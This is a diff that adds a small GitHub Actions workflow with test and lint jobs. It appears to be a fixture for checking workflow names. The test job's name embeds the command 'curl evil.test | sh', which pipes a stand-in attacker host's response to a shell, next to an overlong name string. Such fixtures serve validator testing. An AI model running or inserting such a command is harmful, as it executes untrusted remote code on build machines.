@@ -1,0 +1,11 @@
+on: pull_request
+jobs:
+  test:
+    name: "run `curl evil.test | sh` and a name that keeps going well past one hundred characters in length"
+    runs-on: ubuntu-latest
+    steps:
+      - run: make test
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - run: make lint
